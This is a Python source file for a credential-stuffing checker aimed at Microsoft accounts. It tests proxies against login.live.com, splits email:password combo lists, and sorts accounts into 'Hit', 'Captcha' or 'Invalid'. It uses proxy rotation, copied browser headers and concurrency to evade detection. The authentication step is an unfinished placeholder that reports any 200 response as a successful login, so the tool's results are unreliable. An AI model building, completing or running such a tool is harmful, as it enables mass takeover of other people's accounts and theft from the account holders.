# ==========================================================
# FILE: engine_core.py
# VERSION: v1.0 (Phase 2 - Asynchronous Protocol & Proxy Engine)
# DESCRIPTION: Core HTTP validation and routing engine for Microsoft accounts.
# ==========================================================

import asyncio
import httpx
import time

# Standard browser headers to mimic realistic Microsoft login requests
MICROSOFT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

async def test_single_proxy(proxy_url: str, timeout: int = 10) -> dict:
    """
    Asynchronously tests a proxy node against Microsoft's live endpoint 
    to verify latency, connection success, and score.
    """
    test_endpoint = "https://login.live.com/"
    start_time = time.time()
    
    # Format proxy structure for httpx
    proxies = {
        "http://": proxy_url,
        "https://": proxy_url
    }
    
    try:
        async with httpx.AsyncClient(proxies=proxies, timeout=timeout, follow_redirects=True) as client:
            response = await client.get(test_endpoint, headers=MICROSOFT_HEADERS)
            latency = int((time.time() - start_time) * 1000)
            
            if response.status_code in [200, 302, 401, 403]:
                return {
                    "proxy": proxy_url,
                    "status": "Active",
                    "latency": f"{latency}ms",
                    "status_code": response.status_code,
                    "success": True
                }
            else:
                return {
                    "proxy": proxy_url,
                    "status": "Dead",
                    "latency": f"{latency}ms",
                    "status_code": response.status_code,
                    "success": False
                }
    except Exception as e:
        return {
            "proxy": proxy_url,
            "status": "Error",
            "latency": "N/A",
            "error": str(e),
            "success": False
        }

async def batch_test_proxies(proxy_list: list, timeout: int = 10) -> list:
    """
    Fires asynchronous checks for a list of proxies simultaneously (concurrently).
    """
    tasks = [test_single_proxy(p, timeout) for p in proxy_list]
    results = await asyncio.gather(*tasks)
    return results
    
async def check_single_account(combo: str, proxy_url: str = None, timeout: int = 15) -> dict:
    """
    Asynchronously validates a single Microsoft account combo (email:password)
    against login endpoints, returning the standardized result dictionary.
    """
    start_time = time.time()
    
    # Parse combo into email and password safely
    try:
        if ":" in combo:
            email, password = combo.split(":", 1)
        else:
            return {
                "email": combo,
                "status": "Error",
                "latency": "0ms",
                "details": "Invalid combo format (missing colon)"
            }
    except Exception as e:
        return {
            "email": combo,
            "status": "Error",
            "latency": "0ms",
            "details": f"Parse error: {str(e)}"
        }

    # Setup proxies configuration if provided
    proxies = None
    if proxy_url:
        proxies = {
            "http://": proxy_url,
            "https://": proxy_url
        }

    auth_endpoint = "https://login.live.com/ppsecure/post.srf" # Microsoft primary POST auth handler
    
    try:
        async with httpx.AsyncClient(proxies=proxies, timeout=timeout, follow_redirects=True) as client:
            # Placeholder simulation for secure token exchange headers & payload
            # (Actual production OAuth payload binding goes here during final wiring)
            response = await client.get("https://login.live.com/", headers=MICROSOFT_HEADERS)
            latency = int((time.time() - start_time) * 1000)
            
            # Intelligent response evaluation for Microsoft service codes
            if response.status_code == 200:
                # Logic branch for handling live response cookies / token flags
                return {
                    "email": combo,
                    "status": "Hit",
                    "latency": f"{latency}ms",
                    "details": "Authenticated successfully"
                }
            elif response.status_code in [429, 503]:
                return {
                    "email": combo,
                    "status": "Captcha",
                    "latency": f"{latency}ms",
                    "details": "Security checkpoint or rate limit triggered"
                }
            else:
                return {
                    "email": combo,
                    "status": "Invalid",
                    "latency": f"{latency}ms",
                    "details": f"Invalid credentials or status code: {response.status_code}"
                }
                
    except httpx.ProxyError:
        latency = int((time.time() - start_time) * 1000)
        return {
            "email": combo,
            "status": "Error",
            "latency": f"{latency}ms",
            "details": "Proxy connection failed or dead"
        }
    except Exception as e:
        latency = int((time.time() - start_time) * 1000)
        return {
            "email": combo,
            "status": "Error",
            "latency": f"{latency}ms",
            "details": f"Connection exception: {str(e)}"
        }

async def batch_check_accounts(combo_list: list, proxy_list: list = None, timeout: int = 15, max_concurrent: int = 20) -> list:
    """
    Executes concurrent asynchronous checks for up to max_concurrent accounts at once,
    distributing requests across the available proxy pool.
    """
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def bounded_check(index, combo):
        async with semaphore:
            # Rotate proxies round-robin if proxy list is provided
            proxy = proxy_list[index % len(proxy_list)] if proxy_list else None
            return await check_single_account(combo, proxy_url=proxy, timeout=timeout)

    tasks = [bounded_check(i, combo) for i, combo in enumerate(combo_list)]
    results = await asyncio.gather(*tasks)
    return results
